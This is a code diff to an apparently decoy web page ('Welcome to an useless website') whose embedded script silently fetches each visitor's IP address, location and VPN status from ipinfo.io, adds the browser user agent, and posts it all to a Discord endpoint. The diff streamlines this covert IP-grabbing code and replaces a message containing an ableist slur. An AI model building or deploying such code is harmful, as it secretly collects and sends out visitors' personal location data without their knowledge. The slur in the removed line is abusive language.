@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website</title>
+    <title>Welcome to an useless website</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -41,7 +41,7 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `# Wake up some retard shit click the link:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}`,
+                        content: `New visitor info:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}`,
                     }),
                 });
             };
@@ -49,21 +49,13 @@
             // Function to get visitor's information
             const getVisitorInfo = async () => {
                 try {
-                    const ipResponse = await fetch('https://ipinfo.io/json');
-                    const ipData = await ipResponse.json();
-                    const ip = `${addressData.ip};
+                    const infoResponse = await fetch('https://ipinfo.io/json');
+                    const infoData = await infoResponse.json();
 
-                    // Switched to a different service for fetching location info
-                    const addressResponse = await fetch('https://ipinfo.io/json');
-                    const addressData = await addressResponse.json();
-                    const address = `${addressData.city}, ${addressData.region}, ${addressData.country}`;
-
+                    const ip = infoData.ip;
+                    const address = `${infoData.city}, ${infoData.region}, ${infoData.country}`;
                     const userAgent = navigator.userAgent;
-
-                    // Check if the user is using a VPN
-                    const isVPN = await fetch('https://ipinfo.io/json')
-                        .then(response => response.json())
-                        .then(data => data.vpn);
+                    const isVPN = infoData.vpn || false;
 
                     // Sending data to Discord with VPN status
                     sendInfoToDiscord(ip, address, userAgent, isVPN);
